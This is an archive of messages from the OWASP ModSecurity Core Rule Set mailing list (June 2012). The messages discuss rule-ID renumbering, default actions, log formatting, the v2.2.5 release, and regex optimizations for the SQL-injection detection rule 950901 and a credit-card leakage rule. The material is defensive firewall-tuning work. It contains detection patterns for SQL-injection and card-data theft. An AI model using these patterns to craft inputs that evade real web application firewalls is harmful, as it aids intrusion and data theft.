OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120608/63bc2a19/attachment.html>

From michael.haas10 at gmail.com  Fri Jun  8 20:48:07 2012
From: michael.haas10 at gmail.com (Michael Haas)
Date: Fri, 8 Jun 2012 22:48:07 +0200
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread] Updating Rule IDs
In-Reply-To: <CBF561BE.505B1%rbarnett@trustwave.com>
References: <CAFoCuZqaazJ3+bwP+K5XyC8YKHMFG+Cvu3n2A_eVg4RWkoEA6w@mail.gmail.com>
	<CBF561BE.505B1%rbarnett@trustwave.com>
Message-ID: <CAFW5hxCjQJEeDzEo4KCZ0FEyHDqXsdpkpz_my18oOb5xjFa=Kw@mail.gmail.com>

Hello,

Ruleid's should never be reused.
I think it would be also a great benefit if the rev field is only
updated if something has changed in the actual rule.
That would make it easier to search with normal diff command for updates.

Thanks
Michael

2012/6/7 Ryan Barnett <RBarnett at trustwave.com>:
>
> On 6/6/12 6:47 PM, "Klaubert Herr da Silveira" <klaubert at gmail.com> wrote:
>
>>Ryan,
>>
>>The "highly optimized regexes" will be written optimized or will be
>>optimized by a tool? If is written and then optimized, will be very
>>useful to have the "source" for debuging purpose, like a version
>>minified and a standard version of a js lib.
>
> Yes, we can do that. ?Just to be clear, we are planning on extensively
> using the @pm/@pmf to do fast pre-qualification of groups of rules. ?If
> these rules match, then we will execute the optimized regular expression
> rules. ?What we can do is provide the smaller regex sources with Apache
> comments prior to the rules.
>
> So, you would really have two ways of knowing the source data for the
> optimized regexes:
> 1) The plain text string pm data, and
> 2) The smaller, individual regexes.
>
> -Ryan
>
>>
>>Klaubert Herr
>>
>>On Wed, Jun 6, 2012 at 11:23 AM, Ryan Barnett <RBarnett at trustwave.com>
>>wrote:
>>> One of the items we are considering with the CRS v3.0 update is to start
>>> from scratch with all of the rule IDs. ?We have a defined range
>>>reserved for
>>> the OWASP CRS -
>>>
>>>https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Refer
>>>ence_Manual#id
>>>
>>> 900,000?999,999: reserved for the OWASP ModSecurity Core Rule
>>> Set [12] project
>>>
>>> The rationale for this change is to make it easier to users to do
>>>exceptions
>>> and disable groups of rules by using SecRuleRemoveById, etc? That
>>>directive
>>> has the capability to remove ranges of rule IDs, however over the years
>>>the
>>> rule IDs were added ad-hoc and they are not properly grouped in this
>>>manner.
>>> ?For instance, groupings could be something similar to this -
>>>
>>> Protocol Violation ? 900000-900099
>>> Protocol Policies - 900100?900199
>>> Cross-site Scripting - 900200?900299
>>> ?
>>>
>>> We would give each rule group approx 100 rule IDs. ?The initial number
>>>would
>>> be less than that which would allow some growth. ?After some analysis
>>>of the
>>> current rules, we really shouldn't ever exceed those allotments as there
>>> ends up being rule logic duplication and you just end up with bloated
>>>rule
>>> amounts.
>>>
>>> Keep in mind that the active rule IDs were going to change a bit anyways
>>> with this update as we will be consolidating many rules into highly
>>> optimized regexes, etc..
>>>
>>> The only concern that I have with making this move would be if users
>>>have
>>> extensively implemented exceptions based on the current rule IDs. ?They
>>> would need to be aware of this when they migrate to v3.0.
>>>
>>> Comments?
>>>
>>> --
>>> Ryan Barnett
>>> Trustwave SpiderLabs
>>> ModSecurity Project Leader
>>> OWASP ModSecurity CRS Project Leader
>>>
>>> ________________________________
>>> This transmission may contain information that is privileged,
>>>confidential,
>>> and/or exempt from disclosure under applicable law. If you are not the
>>> intended recipient, you are hereby notified that any disclosure,
>>>copying,
>>> distribution, or use of the information contained herein (including any
>>> reliance thereon) is STRICTLY PROHIBITED. If you received this
>>>transmission
>>> in error, please immediately contact the sender and destroy the
>>>material in
>>> its entirety, whether in electronic or hard copy format.
>>>
>>> _______________________________________________
>>> Owasp-modsecurity-core-rule-set mailing list
>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>>>
>>
>
>
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
>
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

From michael.haas10 at gmail.com  Fri Jun  8 21:10:34 2012
From: michael.haas10 at gmail.com (Michael Haas)
Date: Fri, 8 Jun 2012 23:10:34 +0200
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread] 10 Setup Conf File: SecDefaultAction
In-Reply-To: <CBF50352.50508%rbarnett@trustwave.com>
References: <CBF502DA.50503%rbarnett@trustwave.com>
	<CBF50352.50508%rbarnett@trustwave.com>
Message-ID: <CAFW5hxDYVd2E74XU61TuhrAdi35XaSp69rR1o=5L08hLbfebrw@mail.gmail.com>

Maybe also an environment variable should be set?
SecDefaultAction "phase:2,deny,setenv:modsec=denied,log"
With this the user could display a different msg with a #if expr= in
the error page.

Michael


2012/6/6 Ryan Barnett <RBarnett at trustwave.com>:
> Updated the following section for the SecDefaultAction directive that
> controls the mode of operation ? either self-contained or collaborative
> detection.
>
> #
> # -- [[ Modes of Operation: Self-Contained vs. Collaborative Detection ]]
> -----------------
> #
> # Each detection rule uses the "block" action which will inherit the
> SecDefaultAction
> # specified below. ?Your settings here will determine which mode of
> operation you use.
> #
> # -- [[ Self-Contained Mode ]] --
> # Rules inherit the "deny" disruptive action. ?The first rule that matches
> will block.
> #
> # -- [[ Collaborative Detection Mode ]] --
> # This is a "delayed blocking" mode of operation where each matching rule
> will inherit
> # the "pass" action and will only contribute to anomaly scores.
> ?Transactional blocking
> # can be applied
> #
> # -- [[ Alert Logging Control ]] --
> # You have three options -
> #
> # - To log to both the Apache error_log and ModSecurity audit_log file use:
> "log"
> # - To log *only* to the ModSecurity audit_log file use: "nolog,auditlog"
> # - To log *only* to the Apache error_log file use: "log,noauditlog"
> #
> # Ref:
> http://blog.spiderlabs.com/2010/11/advanced-topic-of-the-week-traditional-vs-anomaly-scoring-detection-modes.html
> # Ref:
> https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#SecDefaultAction
> #
> SecDefaultAction "phase:2,deny,log"
>
> For discussion purposes, regarding "disruptive actions", I believe that we
> should consider responding differently to malicious transactions. ?Issuing
> HTTP 4xx level response codes are of no help to non-malicious end users who
> have innocently triggered an alert and they also "tip the hand" a bit to
> malicious users that there is some type of separate security layer in place.
> ?I am a proponent of trying to make a WAF deployment transparent to the user
> ? meaning that they can decipher when ModSecurity has triggered an alert vs.
> if the application itself issues some type of violation.
>
> For example ? oftentimes when an invalid request is received, applications
> will issue 302 Redirects back to the previous page or a login page. ?I would
> like to prose the idea of using the redirect action here within the
> SecDefaultAction setting and letting the ModSec Admin choose where?to
> redirect users too when an alert is triggered. ?Example:
>
> SecDefaultAction "phase:2,redirect:http://www.example.com/login.php,log"
>
> Comments?
>
> --
> Ryan Barnett
> Trustwave SpiderLabs
> ModSecurity Project Leader
> OWASP ModSecurity CRS Project Leader
>
> ________________________________
> This transmission may contain information that is privileged, confidential,
> and/or exempt from disclosure under applicable law. If you are not the
> intended recipient, you are hereby notified that any disclosure, copying,
> distribution, or use of the information contained herein (including any
> reliance thereon) is STRICTLY PROHIBITED. If you received this transmission
> in error, please immediately contact the sender and destroy the material in
> its entirety, whether in electronic or hard copy format.
>
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>

From RBarnett at trustwave.com  Fri Jun  8 21:11:57 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Fri, 8 Jun 2012 16:11:57 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread] Updating Rule IDs
In-Reply-To: <CAFW5hxCjQJEeDzEo4KCZ0FEyHDqXsdpkpz_my18oOb5xjFa=Kw@mail.gmail.com>
References: <CAFoCuZqaazJ3+bwP+K5XyC8YKHMFG+Cvu3n2A_eVg4RWkoEA6w@mail.gmail.com>
	<CBF561BE.505B1%rbarnett@trustwave.com>
	<CAFW5hxCjQJEeDzEo4KCZ0FEyHDqXsdpkpz_my18oOb5xjFa=Kw@mail.gmail.com>
Message-ID: <C54775D1-238C-40B7-AD9F-C35855AE3964@trustwave.com>

Agreed. We added the ver action to 2.7 -
http://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Reference_Manual#ver

We will be using that to hold the main CRS value (such as OWASP_CRS/2.2.5). We will the. Use the rev action for its intended purpose to track modifications to an existing rule ID.

I think it would also be good to include a ruleid-map file that will make it easier to see what was added/changed.

Ryan

On Jun 8, 2012, at 4:48 PM, "Michael Haas" <michael.haas10 at gmail.com> wrote:

> Hello,
>
> Ruleid's should never be reused.
> I think it would be also a great benefit if the rev field is only
> updated if something has changed in the actual rule.
> That would make it easier to search with normal diff command for updates.
>
> Thanks
> Michael
>
> 2012/6/7 Ryan Barnett <RBarnett at trustwave.com>:
>>
>> On 6/6/12 6:47 PM, "Klaubert Herr da Silveira" <klaubert at gmail.com> wrote:
>>
>>> Ryan,
>>>
>>> The "highly optimized regexes" will be written optimized or will be
>>> optimized by a tool? If is written and then optimized, will be very
>>> useful to have the "source" for debuging purpose, like a version
>>> minified and a standard version of a js lib.
>>
>> Yes, we can do that.  Just to be clear, we are planning on extensively
>> using the @pm/@pmf to do fast pre-qualification of groups of rules.  If
>> these rules match, then we will execute the optimized regular expression
>> rules.  What we can do is provide the smaller regex sources with Apache
>> comments prior to the rules.
>>
>> So, you would really have two ways of knowing the source data for the
>> optimized regexes:
>> 1) The plain text string pm data, and
>> 2) The smaller, individual regexes.
>>
>> -Ryan
>>
>>>
>>> Klaubert Herr
>>>
>>> On Wed, Jun 6, 2012 at 11:23 AM, Ryan Barnett <RBarnett at trustwave.com>
>>> wrote:
>>>> One of the items we are considering with the CRS v3.0 update is to start
>>>> from scratch with all of the rule IDs.  We have a defined range
>>>> reserved for
>>>> the OWASP CRS -
>>>>
>>>> https://sourceforge.net/apps/mediawiki/mod-security/index.php?title=Refer
>>>> ence_Manual#id
>>>>
>>>> 900,000?999,999: reserved for the OWASP ModSecurity Core Rule
>>>> Set [12] project
>>>>
>>>> The rationale for this change is to make it easier to users to do
>>>> exceptions
>>>> and disable groups of rules by using SecRuleRemoveById, etc? That
>>>> directive
>>>> has the capability to remove ranges of rule IDs, however over the years
>>>> the
>>>> rule IDs were added ad-hoc and they are not properly grouped in this
>>>> manner.
>>>>  For instance, groupings could be something similar to this -
>>>>
>>>> Protocol Violation ? 900000-900099
>>>> Protocol Policies - 900100?900199
>>>> Cross-site Scripting - 900200?900299
>>>> ?
>>>>
>>>> We would give each rule group approx 100 rule IDs.  The initial number
>>>> would
>>>> be less than that which would allow some growth.  After some analysis
>>>> of the
>>>> current rules, we really shouldn't ever exceed those allotments as there
>>>> ends up being rule logic duplication and you just end up with bloated
>>>> rule
>>>> amounts.
>>>>
>>>> Keep in mind that the active rule IDs were going to change a bit anyways
>>>> with this update as we will be consolidating many rules into highly
>>>> optimized regexes, etc..
>>>>
>>>> The only concern that I have with making this move would be if users
>>>> have
>>>> extensively implemented exceptions based on the current rule IDs.  They
>>>> would need to be aware of this when they migrate to v3.0.
>>>>
>>>> Comments?
>>>>
>>>> --
>>>> Ryan Barnett
>>>> Trustwave SpiderLabs
>>>> ModSecurity Project Leader
>>>> OWASP ModSecurity CRS Project Leader
>>>>
>>>> ________________________________
>>>> This transmission may contain information that is privileged,
>>>> confidential,
>>>> and/or exempt from disclosure under applicable law. If you are not the
>>>> intended recipient, you are hereby notified that any disclosure,
>>>> copying,
>>>> distribution, or use of the information contained herein (including any
>>>> reliance thereon) is STRICTLY PROHIBITED. If you received this
>>>> transmission
>>>> in error, please immediately contact the sender and destroy the
>>>> material in
>>>> its entirety, whether in electronic or hard copy format.
>>>>
>>>> _______________________________________________
>>>> Owasp-modsecurity-core-rule-set mailing list
>>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>>> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>>>>
>>>
>>
>>
>> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
>>
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From RBarnett at trustwave.com  Thu Jun 14 14:23:20 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Thu, 14 Jun 2012 09:23:20 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion Thread]
	Updating the logdata action data
In-Reply-To: <CBF63D42.50788%rbarnett@trustwave.com>
Message-ID: <CBFF6A69.524D3%rbarnett@trustwave.com>

We are considering updating the "logdata" action field in the CRS to
provide more information about the operator match data.  Currently, we
mainly only use %{TX.0} which will show you the exact portion of the
variable data that matched the regex -

SecRule
REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:
/*
"(/\*!?|\*/|[';]--|--[\s\r\n\v\f]|(?:--[^-]*?-)|([^\-&])#.*?[\s\r\n\v\f]|;?
\\x00)"
"phase:2,rev:'2.2.5',id:'981231',t:none,t:urlDecodeUni,block,msg:'SQL
Comment Sequence
Detected.',capture,logdata:'%{tx.0}',tag:'WEB_ATTACK/SQL_INJECTION',tag:'WA
SCTC/WASC-19',tag:'OWASP_TOP_10/A1',tag:'OWASP_AppSensor/CIE1',tag:'PCI/6.5
.2',setvar:tx.anomaly_score=+%{tx.warning_anomaly_score},setvar:tx.sql_inje
ction_score=+1,setvar:'tx.msg=%{rule.msg}',setvar:tx.%{rule.id}-WEB_ATTACK/
SQL_INJECTION-%{matched_var_name}=%{tx.0}"

We thinking that it might be more informative to modify the logdata action
to something like this -

logdata:'Data matched: %{TX.0}, within variable payload: %{MATCHED_VAR}'

This would provide more data and context for alerts and may allow for
easier false positive validation without needing to review the full audit
log data.

Comments welcome.

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader


This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.


From jamuse at gmail.com  Thu Jun 14 17:32:11 2012
From: jamuse at gmail.com (Josh Amishav-Zlatin)
Date: Thu, 14 Jun 2012 20:32:11 +0300
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
 Thread] Updating the logdata action data
In-Reply-To: <CBFF6A69.524D3%rbarnett@trustwave.com>
References: <CBF63D42.50788%rbarnett@trustwave.com>
	<CBFF6A69.524D3%rbarnett@trustwave.com>
Message-ID: <CANnPki==EC6MkuEspKrHCOBJ_N1UCEnvGP6t2mTg5bY7KVRuSA@mail.gmail.com>

On Thu, Jun 14, 2012 at 5:23 PM, Ryan Barnett <RBarnett at trustwave.com>wrote:

> ...
>


> We thinking that it might be more informative to modify the logdata action
> to something like this -
>
> logdata:'Data matched: %{TX.0}, within variable payload: %{MATCHED_VAR}'
>
> This would provide more data and context for alerts and may allow for
> easier false positive validation without needing to review the full audit
> log data.
>
> Comments welcome.
>
>
Hey Ryan,

That's a great idea!

--
 - Josh
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120614/ff1799a2/attachment.html>

From RBarnett at trustwave.com  Fri Jun 15 14:21:19 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Fri, 15 Jun 2012 09:21:19 -0500
Subject: [Owasp-modsecurity-core-rule-set] OWASP ModSecurity CRS v2.2.5
	Available
Message-ID: <CC00BD1F.5269F%rbarnett@trustwave.com>

OWASP ModSecurity CRS v2.2.5 Available

This update includes security fixes related to multipart content-type bypasses so users are strongly encouraged to update (download)<https://sourceforge.net/projects/mod-security/files/modsecurity-crs/0-CURRENT/>.  In addition, we have included many cool integration updates.

CHANGES:

Improvements:

 *   Renamed main config file to modsecurity_crs_10_setup.conf
 *   Updated the rule IDs to start from OWASP ModSecurity CRS reserved range: 900000
 *   Updated rule formatting for readability
 *   Updated the CSRF rules to use UNIQUE_ID as the token source
 *   Added the zap2modsec.pl script to the /util directory which converts OWASP ZAP Scanner XML data into ModSecurity Virtual Patches<http://blog.spiderlabs.com/2012/03/modsecurity-advanced-topic-of-the-week-automated-virtual-patching-using-owasp-zed-attack-proxy.html>
 *   Updated the Directory Traversal Signatures to include more obfuscated data
 *   Added Arachni Scanner Integration LUA script/rules files<http://blog.spiderlabs.com/2012/06/dynamic-dastwaf-integration-realtime-virtual-patching.html>

Bug Fixes:

 *   Added forceRequestBodyVariable action to rule ID 960904
 *   Updated the anomaly scoring value for rule ID 960000 to critical (Identified by QualysVulnerability & Malware Research Labs (VMRL))
 *   Updated Content-Type check to fix possible evasion with @within (Identified by Qualys Vulnerability & Malware Research Labs (VMRL))

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120615/3d3b10dd/attachment.html>

From RBarnett at trustwave.com  Tue Jun 19 15:51:41 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Tue, 19 Jun 2012 10:51:41 -0500
Subject: [Owasp-modsecurity-core-rule-set] HTTP Request Smuggling Attacks
	(CRS Rule ID 950012)
Message-ID: <CC06184C.52C49%rbarnett@trustwave.com>

Does anyone have an example alert/audit log from a legitimate HTTP Request Smuggling Attack (CRS Rule ID 950012)?

I am interested in attack frequency.  I believe that while this is a legitimate issue, that it is rarely seen in the wild.

If you have any alerts/audit logs, please send them to me.

Thanks.

--
Ryan Barnett
Trustwave SpiderLabs
ModSecurity Project Leader
OWASP ModSecurity CRS Project Leader

________________________________
This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120619/63476ca7/attachment.html>

From RBarnett at trustwave.com  Tue Jun 19 16:00:54 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Tue, 19 Jun 2012 11:00:54 -0500
Subject: [Owasp-modsecurity-core-rule-set] [Rule Update - Discussion
	Thread] Skype Chat
In-Reply-To: <CBF6418E.507D9%rbarnett@trustwave.com>
Message-ID: <CC061A35.52C4E%rbarnett@trustwave.com>

If anyone else wants on the CRS skype chat, let me know.  It is a great
way to have real-time discussions :)

-Ryan



On 6/7/12 11:32 AM, "Ryan Barnett" <RBarnett at trustwave.com> wrote:

>We are starting a Skype chat channel to discuss the CRS updates.  If you
>want to join in the discussions, send me your contact info (rcbarnett) and
>I will add you to the live chat :)
>
>--
>Ryan Barnett
>Trustwave SpiderLabs
>ModSecurity Project Leader
>OWASP ModSecurity CRS Project Leader
>


This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.


From benji0256 at yahoo.com  Wed Jun 20 19:35:18 2012
From: benji0256 at yahoo.com (Benjamin Flament)
Date: Wed, 20 Jun 2012 12:35:18 -0700 (PDT)
Subject: [Owasp-modsecurity-core-rule-set] Rule 950901 optimization
Message-ID: <1340220918.6357.YahooMailNeo@web162005.mail.bf1.yahoo.com>

Hi

Rule 950901 on CRS 2.2.5 is missing several regex optimizations. It captures way too much data and tends to originate alerts related to PCRE capture limits exceeded.

I sugest changing it from:

"(?i:([\s'\"`???\(\)]*)?([\d\w]+)([\s'\"`???\(\)]*)?(?:=|<=>|r?like|sounds\s+like|regexp)([\s'\"`???\(\)]*)?\2|([\s'\"`???\(\)]*)?([\d\w]+)([\s'\"`???\(\)]*)?(?:!=|<=|>=|<>|<|>|\^|is\s+not|not\s+like|not\s+regexp)([\s'\"`???\(\)]*)?(?!\6)([\d\w]+))"

to:

"(?i:[\s'\"`???\(\)]*([\d\w]+)[\s'\"`???\(\)]*(?:=|<=>|r?like|sounds\s+like|regexp)[\s'\"`???\(\)]*\1|[\s'\"`???\(\)]*([\d\w]+)[\s'\"`???\(\)]*(?:!=|<=|>=|<>|<|>|\^|is\s+not|not\s+like|not\s+regexp)[\s'\"`???\(\)]*(?:(?!\2))[\d\w]+)"

The only modifications are the removal of some redundant characters and adding of non capturing groups to some parts.

Regards
Benjamin
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20120620/e07bebdc/attachment.html>

From andrewn at locus.net  Wed Jun 20 21:14:00 2012
From: andrewn at locus.net (Andrew Norris)
Date: Wed, 20 Jun 2012 17:14:00 -0400
Subject: [Owasp-modsecurity-core-rule-set] Rule 950901 optimization
In-Reply-To: <1340220918.6357.YahooMailNeo@web162005.mail.bf1.yahoo.com>
References: <1340220918.6357.YahooMailNeo@web162005.mail.bf1.yahoo.com>
Message-ID: <4FE23D18.30204@locus.net>

For what it's worth I'll throw my optimization for that rule into the mix:

"(?i:([\s'\"`???\(\)]*)([\d\w]++)([\s'\"`???\(\)]*)(?:(?:=|<=>|r?like|sounds\s+like|regexp)([\s'\"`???\(\)]*)\2|(?:!=|<=|>=|<>|<|>|\^|is\s+not|not\s+like|not\s+regexp)([\s'\"`???\(\)]*)(?!\2)([\d\w]+)))"

On 06/20/2012 03:35 PM, Benjamin Flament wrote:
> Hi
> 
> Rule 950901 on CRS 2.2.5 is missing several regex optimizations. It
> captures way too much data and tends to originate alerts related to PCRE
> capture limits exceeded.
> 
> I sugest changing it from:
> 
> "(?i:([\s'\"`???\(\)]*)?([\d\w]+)([\s'\"`???\(\)]*)?(?:=|<=>|r?like|sounds\s+like|regexp)([\s'\"`???\(\)]*)?\2|([\s'\"`???\(\)]*)?([\d\w]+)([\s'\"`???\(\)]*)?(?:!=|<=|>=|<>|<|>|\^|is\s+not|not\s+like|not\s+regexp)([\s'\"`???\(\)]*)?(?!\6)([\d\w]+))"
> 
> to:
> 
> "(?i:[\s'\"`???\(\)]*([\d\w]+)[\s'\"`???\(\)]*(?:=|<=>|r?like|sounds\s+like|regexp)[\s'\"`???\(\)]*\1|[\s'\"`???\(\)]*([\d\w]+)[\s'\"`???\(\)]*(?:!=|<=|>=|<>|<|>|\^|is\s+not|not\s+like|not\s+regexp)[\s'\"`???\(\)]*(?:(?!\2))[\d\w]+)"
> 
> The only modifications are the removal of some redundant characters and
> adding of non capturing groups to some parts.
> 
> Regards
> Benjamin
> 
> 
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
Andrew Norris
Systems Administrator
Locus Telecommunications
andrewn at locus.net
(201)-585-3605

From RBarnett at trustwave.com  Wed Jun 20 21:45:26 2012
From: RBarnett at trustwave.com (Ryan Barnett)
Date: Wed, 20 Jun 2012 16:45:26 -0500
Subject: [Owasp-modsecurity-core-rule-set] Rule 950901 optimization
In-Reply-To: <4FE23D18.30204@locus.net>
References: <1340220918.6357.YahooMailNeo@web162005.mail.bf1.yahoo.com>
	<4FE23D18.30204@locus.net>
Message-ID: <22D5647C-D4FB-406D-9628-0F7A434379EA@trustwave.com>

Guys,
This is GREAT feedback. As part of the CRS update, we want to do this type of analysis on all rules.

I will be sending out emails to start the discussions.

Ryan

On Jun 20, 2012, at 5:14 PM, Andrew Norris <andrewn at locus.net> wrote:

> For what it's worth I'll throw my optimization for that rule into the mix:
>
> "(?i:([\s'\"`???\(\)]*)([\d\w]++)([\s'\"`???\(\)]*)(?:(?:=|<=>|r?like|sounds\s+like|regexp)([\s'\"`???\(\)]*)\2|(?:!=|<=|>=|<>|<|>|\^|is\s+not|not\s+like|not\s+regexp)([\s'\"`???\(\)]*)(?!\2)([\d\w]+)))"
>
> On 06/20/2012 03:35 PM, Benjamin Flament wrote:
>> Hi
>>
>> Rule 950901 on CRS 2.2.5 is missing several regex optimizations. It
>> captures way too much data and tends to originate alerts related to PCRE
>> capture limits exceeded.
>>
>> I sugest changing it from:
>>
>> "(?i:([\s'\"`???\(\)]*)?([\d\w]+)([\s'\"`???\(\)]*)?(?:=|<=>|r?like|sounds\s+like|regexp)([\s'\"`???\(\)]*)?\2|([\s'\"`???\(\)]*)?([\d\w]+)([\s'\"`???\(\)]*)?(?:!=|<=|>=|<>|<|>|\^|is\s+not|not\s+like|not\s+regexp)([\s'\"`???\(\)]*)?(?!\6)([\d\w]+))"
>>
>> to:
>>
>> "(?i:[\s'\"`???\(\)]*([\d\w]+)[\s'\"`???\(\)]*(?:=|<=>|r?like|sounds\s+like|regexp)[\s'\"`???\(\)]*\1|[\s'\"`???\(\)]*([\d\w]+)[\s'\"`???\(\)]*(?:!=|<=|>=|<>|<|>|\^|is\s+not|not\s+like|not\s+regexp)[\s'\"`???\(\)]*(?:(?!\2))[\d\w]+)"
>>
>> The only modifications are the removal of some redundant characters and
>> adding of non capturing groups to some parts.
>>
>> Regards
>> Benjamin
>>
>>
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
>
> --
> Andrew Norris
> Systems Administrator
> Locus Telecommunications
> andrewn at locus.net
> (201)-585-3605
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is STRICTLY PROHIBITED. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From jeremy.b at infosend.com  Thu Jun 21 21:25:34 2012
From: jeremy.b at infosend.com (Jeremy Brown)
Date: Thu, 21 Jun 2012 21:25:34 +0000
Subject: [Owasp-modsecurity-core-rule-set] Question on
	optional_rules/modsecurity_crs_25_cc_known.conf
Message-ID: <4A12944D9F6AB24BB3423EEB6AED8860CEE1274A@FUL-INF-MAIL-01.infosendmail.local>

Hello All,

I am admitedly a novice at mod_security, and am currently trying to get myself up to speed by tuning it in a test environment to my needs.

I have been testing the rules in optional_rules/modsecurity_crs_25_cc_known.conf (2.2.5), and am having problems getting the RESPONSE_BODY rules near the bottom to work properly.  FYI: The REQUEST rules near the top work fine.

Using a fake Visa number that matches MOD10 validation, what I have found through debug is that rule 920008 is matching properly.  However, it moves on to the next rule in the chain, line 75 (SecRule TX:1....), which is returning "Rule returned 0."   This seems to terminate the chain and nullify the effect of the parent rule, 920008.

What I found through Ivan's book is that TX:# variables will apparently not be set if the "capture" action is not set.  When I add "capture" to 920008, everything works as expected.

Am I misunderstanding this problem?  Should capture not be a required action in the parent of the chain?  Thank you for your assistance.

****************
* ORIGINAL RULES *
****************

# Visa
SecRule RESPONSE_BODY|RESPONSE_HEADERS:Location "@verifyCC (?:^|[^\d])(?<!google_ad_client = \"pub-)(4\d{3}\-?\d{4}\-?\d{2}\-?\d{2}\-?\d(?:\d{3})??)(?:[^\d]|$)" \
  "chain,logdata:'Start of CC #: %{tx.ccdata_begin}***...',phase:4,t:none,ctl:auditLogParts=-E,block,msg:'Visa Credit Card Number sent from site to user',id:'920008',tag:'WASCTC/5.2',t
        SecRule TX:1 "(\d{4}\-?\d{4}\-?\d{2}\-?\d{2}\-?\d{1,4})" "chain,capture,setvar:tx.ccdata=%{tx.1}"
